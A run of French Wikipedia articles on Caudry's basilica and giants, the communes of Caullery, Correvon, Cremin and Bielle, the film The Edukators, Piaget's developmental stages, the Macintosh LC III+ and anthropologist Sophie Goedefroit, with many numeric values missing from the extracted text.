La paroisse de Caudry est mentionnée dès 1181. L'église de la paroisse est la basilique Sainte Maxellende, dont la construction résulta de la forte croissance démographique dans la seconde moitié du . L'ancienne église, située à l'extrémité est de l'actuelle place des Mantilles, était devenue trop petite et tombait en ruines. La décision de construire une nouvelle église à un autre emplacement fut prise en 1885. On fit appel à Louis Marie Cordonnier, un architecte de renom. La première pierre fut posée le et la consécration de l'édifice par Odon Thibaudier, eut lieu le . L'église fut élevée au rang de basilique mineure par un bref pontifical du .
De style néo-gothique, elle est construite en brique sur un soubassement de pierre blanche. Elle mesure de longueur totale et de largeur au transept. Le clocher culmine à . Il comporte un carillon de trois cloches : "Vox Dei", pesant deux tonnes, sonne le "Do" ; "Pax", , sonne le "Ré" ; Maxellende, , sonne le "Fa". Ces cloches bénies en 1920 et 1922 remplacent celles emportées par les Allemands en 1918.
Dans la tribune, au-dessus de l'entrée, est installé le grand orgue construit en 1913 par Charles Mutin de la maison Cavaillé-Coll.
À l'intérieur, la grande nef culmine à de haut sous la clef de voûte et les deux bas-côtés à . Le transept se termine par deux chapelles, celle de gauche dédiée à Notre Dame du Rosaire, celle de droite à Maxellende avec la châsse de la sainte, pièce d'orfèvrerie gothique de la deuxième moitié du en cuivre doré et argent repoussé, remaniée aux et classée à l'inventaire des monuments historiques. Le transept est éclairé par deux rosaces comportant chacune de verre posées vers 1921, résultat d'un vœu de la population caudrésienne pendant la Première Guerre mondiale.
Manifestations culturelles et festivités.
Comme beaucoup de villes du Nord, Caudry a ses géants, « Batisse » (Baptiste) et « Laïte » (Adelaïde), créés en 1921 par Léonce Bajart en illustration de la tradition industrielle textile de la ville. Endommagés lors de la Seconde Guerre mondiale, ils furent restaurés en 1951. Batisse est tulliste et porte à l'oreille le crochet qui sert à « renfiler ». Laïte est raccommodeuse, elle tient à la main un coupon de dentelle. Le couple est au centre du carnaval d'été qui se déroule dans la ville. Hauts de cinq mètres, ce sont des géants portés mais munis de roulettes pour les déplacements courts.
Caudry est une ville verte (deux étoiles au label des villes et villages fleuris) qui s'efforce de maintenir vivante sa culture locale, dont un parler, le picard, qui reste apprécié notamment grâce à « La Caudriole », revue littéraire de l'office municipal de la culture.
Héraldique et logotype.
Le logotype de la ville, adopté en 1999, est une stylisation du chariot des métiers de dentelle.

</doc>
<doc id="191697" url="https://fr.wikipedia.org/wiki?curid=191697" title="Caullery (Nord)">
Caullery (Nord)

Caullery est une commune française située dans le département du Nord, en région Hauts-de-France.
Géographie.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le ruisseau d'Iris.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est dans une zone de transition entre le climat océanique et le climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Épehy à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Caullery est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Caudry, dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (85,5 % en 2018), une proportion identique à celle de 1990 (85,5 %). La répartition détaillée en 2018 est la suivante : 
terres arables (71,7 %), zones urbanisées (14,5 %), prairies (13,7 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Toponymie.
Du latin "caulis" (« chou ») → voir Cholet (Maine-et-Loire) et Caulières (Somme).
Histoire.
Une monographie de Caullery a été produite en 1962 par le regretté chanoine Thelliez, enfant du pays.
Ce document édité par R. Trémon Directeur d'École Publique à Caullery, est aujourd'hui épuisé.
Vous pouvez en trouver une retranscription sur ce site "Histoire et Généalogies Caullerésiennes"
Image sur ce site
Politique et administration.
Maire de 1802 à 1808 : Bourlet.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,8 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 25,1 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,99 % de femmes, légèrement supérieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191698" url="https://fr.wikipedia.org/wiki?curid=191698" title="The Edukators">
The Edukators

 (titre original : "", littéralement « Les années grasses sont révolues ») est un film germano-autrichien réalisé par Hans Weingartner et sorti en Allemagne en 2004. Le film a été présenté en sélection officielle en compétition lors du Festival de Cannes 2004.
Synopsis.
Le film raconte l'enlèvement d'un homme d'affaires par trois jeunes activistes anti-capitalistes, Jule (Julia Jentsch), son petit ami Peter (Stipe Erceg) et le meilleur ami de Peter, Jan (Daniel Brühl).
Jule est une serveuse qui a une dette de envers un homme d'affaires dont elle a embouti la luxueuse voiture. Elle sort avec Peter qui est souvent absent la nuit avec son meilleur ami Jan ; ils prétendent coller des affiches.
Lors d'un voyage à Barcelone de Peter, Jan aide Jule à remettre en état son appartement. Les deux jeunes vont alors apprendre à se connaître et Jan révèle à Jule la vérité sur leur travail nocturne quand celle-ci, à l'occasion d'une invitation à diner, découvre les études de Jan sur la sécurité de villas : ils s'introduisent la nuit dans les villas luxueuses et désertes de Berlin pour changer le mobilier de place et laisser une lettre avertissant les propriétaires des lieux que leurs « années de vaches grasses se sont écoulées ». Les lettres sont signées "Les Édukateurs". De cette manière, ils veulent avertir les gens riches qu'ils ne sont pas à l'abri derrière leur argent. Les Édukateurs ne volent rien dans les maisons.
Jule veut essayer et propose de "visiter" la maison de son créancier qui s'appelle Hardenberg. Lors de leur visite, Jule et Jan s'embrassent mais Jan préfère arrêter pour ne pas trahir son ami Peter.
Le lendemain Peter rentre de Barcelone, Jan et Jule décident de ne rien lui dire. Jule découvre rapidement qu'il lui manque son téléphone portable, Jan décide alors de retourner chez Hardenberg. Le soir même, ils retrouvent le portable dans la maison mais lorsqu'ils s'apprêtent à partir, Hardenberg rentre et reconnaît Jule. Pris de panique, Jan l'assomme. Ne sachant que faire, ils appellent Peter pour les aider.
Les trois jeunes décident alors de l'emmener dans le chalet de l'oncle de Jule. Ce chalet est isolé dans la montagne. Durant sa captivité, Hardenberg révèle son passé de leader du parti étudiant socialiste. C'était un ami de Rudi Dutschke. Hardenberg a abandonné ses idéaux et fait carrière pour fonder sa famille.
Jan et Jule se rapprochent, mais Peter devine finalement leur relation et part du chalet après avoir hurlé sur Jan. Il y revient finalement après une soirée.
Ils décident alors de ramener Hardenberg chez lui. En partant, Hardenberg donne une lettre à Jule qui la libère de sa dette, il leur dit alors qu'ils n'ont pas à s'inquiéter pour la police. Seul dans sa villa, Hardenberg semble un moment hésiter à abandonner sa vie aisée. À la fin du film, la police envahit l'appartement de Peter et Jan. Cette scène est en parfaite synchronisation par rapport à une autre scène qui se déroule dans un autre lieu ; cela a pour objectif de faire monter le stress du spectateur. On voit Hardenberg dans une voiture de police laissant supposer qu'il les a finalement dénoncés. Sur un des murs de l'appartement, il est écrit : ().
Accueil.
Le film a reçu en Europe 1,3 million d'entrées – parmi lesquelles en Allemagne, en Autriche et en Suisse. Les pays non germanophones où le film a fait le plus d'entrées sont la Turquie et la France, où environ sont allés voir le film.

</doc>
<doc id="191701" url="https://fr.wikipedia.org/wiki?curid=191701" title="Paliers d'acquisition">
Paliers d'acquisition

Pour le psychologue Jean Piaget, le développement intellectuel de l'enfant se construit et est caractérisé par une série de paliers d'acquisition décrits comme des stades. Ces différents paliers sont hiérarchisés et les structures constitutives d'un stade inférieur servent de base et deviennent parties intégrantes du stade suivant. Il a décrit cette théorie dans son livre "Les origines de l'intelligence chez l'enfant" en 1936. Cette théorie a été révisée par Piaget et a fait l'objet de nombreuses études ultérieures. Elle a beaucoup influencé la recherche en psychologie du développement durant la seconde moitié du .
Les différents stades du développement cognitif.
Stade sensori-moteur.
Pour Jean Piaget, le stade sensorimoteur ou sensori-moteur est le premier stade du développement cognitif de l'enfant et s'étend de la naissance à deux ans environ. À cet âge, le nourrisson ne peut pas s'exprimer verbalement, ce sont donc les observations précises et répétées de son comportement qui indiquent au chercheur ce que l'enfant semble en mesure de percevoir ou d'apprendre. Jean Piaget a pensé que, sur la base de leurs comportements innés et aléatoires, les bébés coordonnaient les informations sensorielles et motrices petit à petit et les utilisaient pour résoudre des problèmes simples. 
C'est le stade de l'action et de l'expérimentation et le début des fixations des traces mnésiques. Les actions-réflexes vont par répétition devenir des actions intentionnelles.
Le stade sensori-moteur comporte six sous-stades: 
Stade préopératoire.
 : le stade pré-opératoire, de 24 mois à 6/7 ans. C'est l'époque de l'apparition de la représentation qui résulte de l'intériorisation des schèmes d'action. Ceux-ci sont acquis et coordonnés dans la pensée sous forme d'image mentale (représentation). L'action peut être effectuée en parole ou par imitation en dehors de la présence d'objet.
Ce stade comporte 2 sous-stades : 
Par exemple, on place un enfant devant une maquette sur une table comportant 3 montagnes de tailles différentes (l'endroit où est assis l'enfant sera le point A). Trois poupées sont assises en face, à droite et à gauche de l'enfant (point B, C et D)
On lui demande alors ce que voit chacune des poupées en lui présentant différentes images.
Ce n'est qu'à partir de 7/8 ans que l'enfant arrivera à coordonner toutes les transformations et à deviner l'image que voit la poupée.
Stade opératoire concret.
 : le stade opératoire concret, de 6/7 à 11/12 ans
C'est un stade où les opérations concrètes se concrétisent.
Apparition d'opérations logiques de raisonnement portant sur des objets présents ou immédiatement représentables.
L'intelligence devint réversible (possibilité de dérouler et d'utiliser les actions du début à la fin et de la fin au début), ce qui va permettre les opérations de conservation, de sériation, de classification, de l'inclusion, de construction du nombre sur des objets perceptibles ou susceptibles d'être produits mentalement.
Les opérations logiques portent sur les données de la réalité.
C'est le registre opératoire concret du fonctionnement intellectuel de l'adulte.
Stade opératoire formel.
 : le stade opératoire formel, à partir de 12 ans
Les opérations portent sur des propositions verbales. Le raisonnement porte sur des propositions abstraites réversibles et combinables et non sur des actions en lien avec le réel. La pensée devient hypothético-déductive, c’est-à-dire que le sujet est capable d'émettre des hypothèses, d'en tirer des conclusions, de faire des plans d'actions, de tenir compte de plusieurs variables.
L'abstraction et la mentalisation permettent une pluralité de stratégies opératoires. Le raisonnement se déroule dans une logique de propositions.
C'est le registre opératoire formel du fonctionnement intellectuel de l'individu.

</doc>
<doc id="191703" url="https://fr.wikipedia.org/wiki?curid=191703" title="Macintosh LC III+">
Macintosh LC III+

Le LC III+ est un ordinateur Macintosh lancé en octobre 1993 et un peu plus puissant que son prédécesseur le LC III. Avec son processeur à , ce fut le plus rapide des Macintosh à base de 68030. Il fut vendu au grand public sous les noms de Performa 460, Performa 466 et Performa 467, selon les configurations de mémoire et de disque dur. La seule différence des modèles "Performa" par rapport au modèle "LC" est qu'ils étaient fournis avec divers logiciels familiaux. Toutes les versions furent arrêtées en février 1994.

</doc>
<doc id="191704" url="https://fr.wikipedia.org/wiki?curid=191704" title="Correvon">
Correvon

Correvon est une localité et une ancienne commune suisse du canton de Vaud. Citée dès 1166, elle fait partie du district de Moudon entre 1803 et 2007, puis du district du Gros-de-Vaud depuis 2008. Elle fait partie de la commune de Montanaire depuis le janvier 2013. La localité se situe dans la région du Gros-de-Vaud, entre les vallées de la Mentue et de la Broye.
Histoire.
Correvon est connu sous le nom de "Correuont" en 1166. L'église Sainte-Marguerite est mentionnée en 1228. Le village dépend de la terre de Saint-Martin puis de la seigneurie de Bioley-Magnoux au Moyen Âge. Il devient une seigneurie au et appartient à un membre de la famille de Goumoëns, puis à la famille de Loys de Marnand. À l'époque bernoise, la seigneurie fait partie du bailliage d'Yverdon et a sa cour de justice. Le village fait ensuite partie du district d'Yverdon entre 1798 et 1803, puis du district de Moudon de 1803 à 2007 et du district du Gros-de-Vaud depuis 2008. L'ancienne chapelle est agrandie en 1903 et est le chœur de l'église actuelle.
Au encore, les loups n'étaient pas rares dans la région.
La commune fusionne, le janvier 2013, avec celles de Chaneaz, Chapelle-sur-Moudon, Denezy, Martherenges, Neyruz-sur-Moudon, Peyres-Possens, Saint-Cierges et Thierrens pour former la nouvelle commune de Montanaire.
Population.
Gentilé et surnoms.
Les habitants de la commune se nomment les Correvonnais ou les Corvounais.
Ils sont notamment surnommés les Rouillons (du nom du rouleau de foin qu'on forme avec un râteau) et "lè Tiu-dè-Pèdze" en patois vaudois (soit ceux qui sont toujours vissés à leur chaise).
Démographie.
Correvon compte habitants en 2010. Sa densité de population atteint hab./km.
En 2000, la population de Correvon est composée de 60 hommes (54,5 %) et 50 femmes (45,5 %). La langue la plus parlée est le français, avec 104 personnes (98,1 %). La deuxième langue est l'allemand (2 ou 1,9 %). Il y a 105 personnes suisses (99,1 %) et 1 personne étrangère (0,9 %). Sur le plan religieux, la communauté protestante est la plus importante avec 78 personnes (73,6 %), suivie des catholiques (21 ou 19,8 %). 5 personnes (4,7 %) n'ont aucune appartenance religieuse.
La population de Correvon est de 156 habitants en 1850. Elle baisse à 126 en 1880 avant de remonter à 156 en 1888. Le nombre d'habitants baisse ensuite jusqu'à 71 en 1970, puis augmente de 42 % en 10 ans jusqu'à 101 en 1980. La population est stable depuis. Le graphique suivant résume l'évolution de la population de Correvon entre 1850 et 2010 :
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à 33,17 % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti libéral-radical avec 21,63 % des suffrages et les Verts avec 15,28 %.
Lors des élections cantonales au Grand Conseil de mars 2011, les habitants de la commune ont voté pour le Parti libéral-radical à 36,98 %, l'Union démocratique du centre à 30,57 %, les Verts à 12,83 %, l'Alliance du centre à 10,19 % et le Parti socialiste à 9,43 %.
Sur le plan communal, Correvon était dirigé par une municipalité formée de 5 membres et dirigée par un syndic pour l'exécutif et un Conseil général dirigé par un président et secondé par un secrétaire pour le législatif.
Économie.
De nos jours encore, l'économie locale est principalement centrée sur l'agriculture, l'arboriculture et l'élevage. En dehors du secteur primaire, il n'existe sur place que très peu d'emplois. La baisse constante de la population jusque dans les années 1970 a conduit à la fermeture de l'école du village en 1945, puis du bureau de poste en 1974. Depuis, plusieurs zones résidentielles ont été créées ; elles sont habitées principalement par des personnes travaillant dans les villes voisines.
Transports.
Correvon fait partie de la communauté tarifaire vaudoise Mobilis. Le bus CarPostal reliant Yverdon-les-Bains à Moudon s'arrête dans la commune. Le village est également desservi par les bus sur appel Publicar, qui sont aussi un service de CarPostal.

</doc>
<doc id="191710" url="https://fr.wikipedia.org/wiki?curid=191710" title="Cremin">
Cremin

Cremin est une localité de la commune suisse de Lucens dans le canton de Vaud, située dans le district de la Broye-Vully et ancienne commune. Citée au moins dès 1365, elle fait partie du district de Moudon entre 1803 et 2007. Le village se situe dans la région de la Broye entre les vallées de la Broye et de la Mentue.
Histoire.
En 1825, un incendie brûle une grande partie des archives communales, limitant de fait la retranscription historique de la commune. Néanmoins, en 1764, le village comportait environ 76 bourgeois répartis en 15 foyers. Ce nombre passe à 94 en 1798 puis 101 en 1850.
Le 30 novembre 2014, les communes de Brenles, Chesalles-sur-Moudon, Cremin, Forel-sur-Lucens, Lucens et Sarzens décident de fusionner. La nouvelle commune voit le jour le janvier 2017 sous le nom de Lucens.
Origine du nom de la commune.
Cremin, doit son nom au marais, maintenant asséché, qui l'entourait au nord et à l'est, où coulait le Riondet, ruisseau maintenant enterré. Originellement appelée "Crêt-Marc", soit « le Crêt sur le marais », La commune s'est ensuite appelée "Cumar", puis Cremin. En 1365, le registre paroissial utilise le nom "Cremyn".
Population.
Gentilé.
Les habitants de la commune se nomment les Creminois.
Démographie.
Cremin comptait habitants avant la fusion. Sa densité de population atteignait hab./km. Entre les fusions avec d'autres communes de Vaugondry, Romairon, Cerniaz, Goumoëns-le-Jux et Villars-sous-Champvent en 2011 et 2012 et sa fusion avec Lucens en 2017, Cremin est la commune la moins peuplée du canton de Vaud.
En 2000, la population de Cremin est composée de 25 hommes (49 %) et 26 femmes (51 %). La langue la plus parlée est le français, avec 47 personnes (94 %). La deuxième langue est l'allemand (3 habitants ou 6 % de la population). Il y a 49 personnes de nationalité suisse (98 %) et une personne étrangère (2 %). Sur le plan religieux, la communauté protestante est la plus importante avec 43 personnes (86 %), suivie des catholiques (4 paroissiens ou 8 % de la population). 3 personnes (6 %) n'ont aucune appartenance religieuse.
La population de Cremin est de 101 habitants en 1850. Elle reste stable pendant vingt ans puis baisse à 45 habitants en 1980. Elle remonte légèrement depuis à 52 habitants en 2010. Le graphique suivant résume l'évolution de la population de Cremin entre 1850 et 2010 :
Politique.
Lors des élections fédérales suisses de 2011, la commune a voté à % pour l'Union démocratique du centre. Les deux partis suivants furent le Parti socialiste suisse avec % des suffrages et les Verts avec %.
Lors des élections cantonales au Grand Conseil de mars 2011, les habitants de la commune ont voté pour l'Union démocratique du centre à %, le Parti libéral-radical à %, le Parti socialiste à %, le Parti bourgeois démocratique et les Vert'libéraux à %, les Verts à % et Vaud Libre à %.
Sur le plan communal, Cremin est dirigé par une municipalité formée de 3 membres et dirigée par un syndic pour l'exécutif et un Conseil général dirigé par un président et secondé par un secrétaire pour le législatif.
Économie.
De nos jours encore, l'économie locale est principalement tournée vers l'agriculture, l'arboriculture et l'élevage. Contrairement à la plupart des communes voisines, aucune zone d'habitation n'a été créée à Cremin à la suite de plans de zones très restrictifs. La seule entreprise installée sur place est un swin golf de 18 trous. Il y a aussi un café-restaurant.
Transports.
Au niveau des transports en commun, Cremin fait partie de la communauté tarifaire vaudoise Mobilis. Deux bus de CarPostal s'y arrêtent : celui reliant Moudon à Lucens et celui reliant Cheiry à Granges-près-Marnand. Le village est aussi desservi par les bus sur appel Publicar, qui sont aussi un service de CarPostal.

</doc>
<doc id="191714" url="https://fr.wikipedia.org/wiki?curid=191714" title="Sophie Goedefroit">
Sophie Goedefroit

Sophie Goedefroit, née le en Belgique, est une anthropologue et archéologue française. 
Elle est professeur à , professeur conseiller à l'université Tongji (Shanghai, Chine) et "docteur honoris causa" de l'université d'Antananarivo (Madagascar). 
Ses recherches portent sur plusieurs domaines de l'anthropologie sociale et ont pour terrain de référence Madagascar avec des ouvertures vers le monde austronésien, notamment les Hauts-Plateaux du Vietnam (Jaraï et Edê) et le Vanuatu (Tanna). 
Biographie.
Sophie Goedefroit est née en 1965 en Belgique. Elle poursuit des études d'archéologie et d'anthropologie à l'Université libre de Bruxelles (ULB) et soutient un mémoire de master consacré aux rituels funéraires chez les Sakalava de Madagascar, sous la direction de Luc de Heusch en 1990. Ce mémoire recevra le prix de la communauté française de Belgique. Elle complète ensuite sa formation à la London School of Economics (LES) auprès de Maurice Bloch et à l'INALCO où elle soutient , en 1991. Allocataire de recherche à l'ORSTOM de 1990 à 1996, elle entreprend un terrain de recherche de plus de 3 ans chez les Sakalava de la côte Ouest de Madagascar qui aboutira à une thèse de doctorat en anthropologie, sous la direction de Jean-François Baré, soutenue à l'Université Panthéon Sorbonne en 1997. et fera l'objet d'un premier ouvrage publié en 1998 (réédition en 2000). 
Après plusieurs expériences de recherches contractuelles et d'enseignements universitaires, elle obtient une bourse d'excellence du Gouvernement du Québec complétée par une bourse postdoctorale du fonds facultaire d'enseignement et de recherche de l'Université de Laval à Québec (1998). Elle obtient également des financements de l'Union Européenne et de l' pour créer une cellule de recherche en anthropologie au sein d'un programme scientifique pluridisciplinaire consacré à la pêche des crevettes à Madagascar, sous tutelle scientifique de l'. Elle y consacrera deux nouvelles années (1998-2000) de terrain de recherche dans le Nord-Ouest malgache. Elle décide ensuite de rejoindre la France où elle est nommée maître de conférences en anthropologie à l'Université de Lille 1 (USTL) et membre du laboratoire en . 
En 2001, elle remporte un financement attribué par l'Institut français de la biodiversité́ (IFB) pour un programme de deux ans intitulé "Enjeux sociaux et économiques de la biodiversité dans un contexte de grande pauvreté : la côte Ouest de Madagascar" pour lequel elle effectue de nombreuses missions de terrain. Elle fonde avec M.C. Cormier Salem dont elle est membre du conseil scientifique. Dans ce cadre, elle crée de nombreux partenariats internationaux, parvient à lever d'importants financements et obtention de bourses pour les doctorants français et étrangers. Elle réalise des expertises pour la coopération internationale et des cabinets d'expertise ainsi que pour d'importants musées. Elle est également nommée dans différentes instances, en qualité d'experte et sollicitée comme pour des revues comme pour l'examen des dossiers de financement de projets scientifiques. 
Elle soutient en 2003 une intitulée "Transfert et détournement. Les sociétés de la côte ouest de Madagascar dans différents contextes de mutation : discours, pratiques et innovations", sous la direction de M. Izard. À la suite de cette soutenance, Sophie Goedefroit est détachée à nouveau à l'IRD (2003/2004), en expatriation à Tananarive, afin de mettre en place le chantier « Stratégies locales dans la construction de patrimoines naturels et de territoires » et de créer à l'université de Tananarive un DEA en anthropologie appliquée au développement. Elle devient directrice d'un projet en partenariat avec le , l'IRD et l'université de Tananarive intitulé "Évaluation et perspectives des transferts de gestion des ressources naturelles dans le cadre du programme environnemental 3", doté d’importants financements. Elle met fin à son détachement à l'IRD et à son expatriation à Madagascar en 2004, à la suite de sa nomination en qualité de Professeur des universités à l'université de Lille 1 (USTL). Dès son retour, elle prend la direction d'un institut existant et fonde l'ISA « Institut de sociologie et d'anthropologie ». Elle rejoint la même année l'équipe du "Traitement informatique des phénomènes de parenté en anthropologie et en histoire : une approche intégrée" (EPHE-CNRS- université Paris 4). Un programme qui aboutira à la création d'un logiciel ("Puck') et de bases de données (corpus généalogiques). 
Nommée professeur à l'université Paris Descartes en , elle intègre l'UMR 8099 (CNRS- Université Paris Descartes, "Langes Musiques, Sociétés"). Elle publie l'année suivante deux ouvrages. Le premier dont elle est coéditeur scientifique est intitulé "Quel développement à Madagascar ? Transfert et détournement- biodiversité et ressources naturelles – conservation, investissement et pratiques locales" sera suivi de la tenue d'un colloque international (5 pays, 7 institutions) à la Sorbonne enregistré dans les archives audiovisuelles de la recherche. Il donnera lieu à . Le second ouvrage, "Andolo. L'art funéraire sakalava (Madagascar)" ou encore d'émissions radiophoniques (France culture, RFI, …) 
En 2008, elle est nommée représentante de l'Institut de Recherche pour le Développement (IRD) pour Madagascar et les autres États insulaires de l'Océan Indien (Comores, Maurice, Seychelles, Maldives), et sera basée à Antananarivo. Elle effectuera deux mandats, tout en poursuivant des activités de recherche notamment dans le cadre d'un programme régional « Patrimoine et premiers peuplements dans l’Océan Indien » (2011- 2014) dont elle assurera la co-direction ou encore, en collaboration avec l'université Laval à Québec, où elle sera invitée en qualité de conférencière d'ouverture au du . 
Sophie Goedefroit quitte Madagascar en 2014 pour prendre la direction du bureau régional de l'Agence universitaire de la francophonie (AUF) pour l'Asie et le Pacifique.

</doc>
<doc id="191716" url="https://fr.wikipedia.org/wiki?curid=191716" title="Bielle (Pyrénées-Atlantiques)">
Bielle (Pyrénées-Atlantiques)

Bielle (en béarnais "Vièla" ou "Bièle") est une commune française, située dans le département des Pyrénées-Atlantiques en région Nouvelle-Aquitaine.
Le gentilé est "Biellois".
Géographie.
Localisation.
La commune de Bielle se trouve dans le département des Pyrénées-Atlantiques, en région Nouvelle-Aquitaine.
Elle se situe à par la route de Pau, préfecture du département, et à d'Oloron-Sainte-Marie, sous-préfecture.
Les communes les plus proches sont : 
Bilhères (), Castet (), Gère-Bélesten (), Louvie-Juzon (), Aste-Béon (), Izeste (), Arudy (), Sainte-Colome ().
Sur le plan historique et culturel, Bielle fait partie de la province du Béarn, qui fut également un État et qui présente une unité historique et culturelle à laquelle s’oppose une diversité frappante de paysages au relief tourmenté.
Paysages et relief.
Le Lauriolle culmine à , le Turon de la Técouère à et le pic "Montagnon" à .
Hydrographie.
La commune est drainée par le gave d'Oloron, L'Arriou Mage, Arrec Dou Sacq, arriou lamousquère, Arriou Médou, Arriou Tort, un bras du gave d'Ossau, gave d'Ossau, L'Arrigast, L'Arrioubeigt, le ruisseau Caou Sèque, le ruisseau de la Técouère, et par divers petits cours d'eau, constituant un réseau hydrographique de de longueur totale.
Le gave d'Oloron, d'une longueur totale de , prend sa source dans la commune de Laruns et s'écoule vers le nord-ouest. Il traverse la commune et se jette dans le gave de Pau à Sorde-l'Abbaye, après avoir traversé .
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique altéré, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat de montagne ou de marges de montagne et est dans la région climatique Pyrénées atlantiques, caractérisée par une pluviométrie élevée (&gt;) en toutes saisons, des hivers très doux ( en plaine) et des vents faibles. Elle est en outre dans la zone H2c au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune d'Arbéost à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Milieux naturels et biodiversité.
Espaces protégés.
La protection réglementaire est le mode d’intervention le plus fort pour préserver des espaces naturels remarquables et leur biodiversité associée.
Dans ce cadre, la commune fait partie de la zone cœur et de l'aire d'adhésion du Parc National des Pyrénées. Créé en 1967 et d'une superficie de , ce parc abrite une faune riche et spécifique particulièrement intéressante : importantes populations d’isards, colonies de marmottes réimplantées avec succès, grands rapaces tels le Gypaète barbu, le Vautour fauve, le Percnoptère d’Égypte ou l’Aigle royal, le Grand tétras et le discret Desman des Pyrénées qui constitue l’exemple type de ce précieux patrimoine confié au Parc national et aussi l'Ours des Pyrénées.
La réserve naturelle de nidification des vautours fauves, créée le , se situe sur le territoire des communes d'Aste-Béon, Bielle, Bilhères et Castet. Le musée qui lui est associé, dénommé « la falaise aux vautours », se trouve à l'entrée du village d'Aste-Béon.
Réseau Natura 2000.
Le réseau Natura 2000 est un réseau écologique européen de sites naturels d'intérêt écologique élaboré à partir des Directives « Habitats » et « Oiseaux », constitué de zones spéciales de conservation (ZSC) et de zones de protection spéciale (ZPS).
Trois sites Natura 2000 ont été définis sur la commune au titre de la « directive Habitats » : 
Zones naturelles d'intérêt écologique, faunistique et floristique.
L’inventaire des zones naturelles d'intérêt écologique, faunistique et floristique (ZNIEFF) a pour objectif de réaliser une couverture des zones les plus intéressantes sur le plan écologique, essentiellement dans la perspective d’améliorer la connaissance du patrimoine naturel national et de fournir aux différents décideurs un outil d’aide à la prise en compte de l’environnement dans l’aménagement du territoire.
Quatre ZNIEFF de sont recensées sur la commune : 
et deux ZNIEFF de : 
Urbanisme.
Typologie.
Au , Bielle est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine et hors attraction des villes.
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d’occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des forêts et milieux semi-naturels (83,8 % en 2018), en augmentation par rapport à 1990 (81,6 %). La répartition détaillée en 2018 est la suivante : 
forêts (53,1 %), milieux à végétation arbustive et/ou herbacée (25,6 %), prairies (13,5 %), espaces ouverts, sans ou avec peu de végétation (5,1 %), zones urbanisées (1,2 %), zones agricoles hétérogènes (0,8 %), eaux continentales (0,7 %). L'évolution de l’occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communication et transports.
Bielle est desservie par la ligne 806 du réseau interurbain des Pyrénées-Atlantiques, qui va de Pau aux Eaux-Bonnes.
